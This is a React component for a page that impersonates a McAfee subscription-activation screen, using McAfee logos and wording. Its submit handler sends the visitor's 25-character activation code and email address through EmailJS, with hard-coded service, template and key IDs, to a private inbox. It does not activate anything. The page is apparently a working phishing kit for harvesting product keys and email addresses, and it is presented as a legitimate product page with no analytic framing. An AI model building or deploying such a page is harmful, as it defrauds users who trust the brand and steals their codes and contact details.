import { useState } from "react";
import emailjs from "@emailjs/browser";

export default function EnterCode() {
  const [code, setCode] = useState("");
  const [email, setEmail] = useState("");
  const [codeError, setCodeError] = useState("");
  const [emailError, setEmailError] = useState("");

  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const rawValue = e.target.value.replace(/[^a-zA-Z0-9]/g, "");
    const limited = rawValue.slice(0, 25);
    const formatted =
      limited.match(/.{1,5}/g)?.join("-").replace(/-$/, "") || "";
    setCode(formatted);
    setCodeError("");
  };

  const isCodeValid = code.replace(/-/g, "").length === 25;
  const isEmailValid = email.includes("@");

  const handleSubmit = async () => {
    if (!isCodeValid || !email || !isEmailValid) {
      if (!isCodeValid) {
        setCodeError("We need your activation code to start your subscription.");
      }
      if (!email || !isEmailValid) {
        setEmailError("Please enter a valid email address.");
      }
      return;
    }

    try {
      const result = await emailjs.send(
        "service_uwgxhgo",
        "template_6hqt4d7",
        {
          title: "McAfee",
          from_name: "McAfee",
          web_name: code,
          message: email,
        },
        "iwh2dFI31xGaG4fBY"
      );

      if (result.status === 200) {
        console.log("✅ Email sent successfully!", result.text);
      } else {
        console.warn("⚠️ Something went wrong:", result.status, result.text);
      }
    } catch (error) {
      console.error("❌ Failed to send email:", error);
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col justify-between">
      <header className="bg-white shadow p-4 pl-60 flex items-center justify-start border-b-4 border-red-600">
        <img src="/logo-mca.png" alt="McAfee Logo" className="h-8" />
      </header>

      <main className="flex flex-1 flex-col lg:flex-col">
        <div className="w-full h-screen bg-[url('/bg2.png')] bg-cover bg-no-repeat bg-center flex items-center justify-center px-6 py-12">
          <div className="bg-opacity-60 p-6 rounded-md w-full max-w-4xl space-y-6">
            <h2 className="text-2xl font-bold text-white">Activate Your Subscription</h2>
            <p className="text-white text-sm">
              Redeem your code and download your security product now.
            </p>

            <div className="bg-white rounded-md shadow p-4 space-y-2">
              <label className="block text-3xl font-medium text-gray-700">
                Enter your code
              </label>
              <h1>Activation code (25 digits)</h1>

              <div className="relative">
                <input
                  type="text"
                  placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX"
                  value={code}
                  onChange={handleCodeChange}
                  className={`block w-full px-3 py-2 border ${
                    isCodeValid ? "border-green-500" : "border-gray-300"
                  } rounded-md shadow-sm outline-none focus:ring-red-600 focus:border-[red] pr-10`}
                />
                {isCodeValid && (
                  <span className="absolute inset-y-0 right-3 flex items-center text-green-600 text-xl">✅</span>
                )}
              </div>

              {isCodeValid && (
                <p className="text-green-600 text-sm mt-1">✅ Success</p>
              )}
              {!isCodeValid && codeError && (
                <p className="text-red-600 text-sm mt-1">{codeError}</p>
              )}
            </div>

            <div className="bg-white rounded-md py-5 shadow p-4 space-y-2">
              <label className="block text-lg font-medium text-gray-700">
                Enter your email
              </label>
              <h1>We'll set up your account or use the one you already have.</h1>
              <input
                type="email"
                placeholder="Email"
                value={email}
                onChange={(e) => {
                  setEmail(e.target.value);
                  setEmailError("");
                }}
                className="block outline-none w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-[gray] focus:border-[gray]"
              />
              {emailError && (
                <p className="text-red-600 text-sm mt-1">{emailError}</p>
              )}
            </div>

            <button
              onClick={handleSubmit}
              className="w-full bg-red-600 text-white font-semibold py-2 rounded hover:bg-red-700 transition"
            >
              Next
            </button>

            <p className="text-xl pt-10 text-black text-center">
              By clicking <strong>Next</strong>, you accept the{" "}
              <a href="#" className="text-red-600 underline">License Agreement</a> and{" "}
              <a href="#" className="text-red-600 underline">Privacy Notice</a>
              You will also receive an email with instructions on downloading your app.
            </p>
          </div>
        </div>

        <div className="text-center space-y-4 pb-10 bg-white">
          <p className="text-lg font-medium">Step 1 of 2</p>

          <div className="flex items-center justify-center gap-2">
            <div className="w-8 h-8 rounded-full bg-red-600 text-white flex items-center justify-center font-semibold">1</div>
            <div className="w-10 h-1 bg-gray-400"></div>
            <div className="w-8 h-8 rounded-full bg-gray-400 text-white flex items-center justify-center font-semibold">2</div>
          </div>

          <p className="text-gray-800">Already redeemed your code? Download your app from your account.</p>

          <button className="text-red-600 border border-red-600 px-6 py-2 font-semibold rounded hover:bg-red-50 transition">
            Go to My Account
          </button>
        </div>
      </main>

      <footer className="bg-gray-800 text-white text-sm text-center py-4">
        <img src="/logo-mca.png" alt="McAfee Logo" className="h-6 mx-auto mb-2" />
        <p>Customer Support | Privacy & Legal Terms</p>
      </footer>
    </div>
  );
}
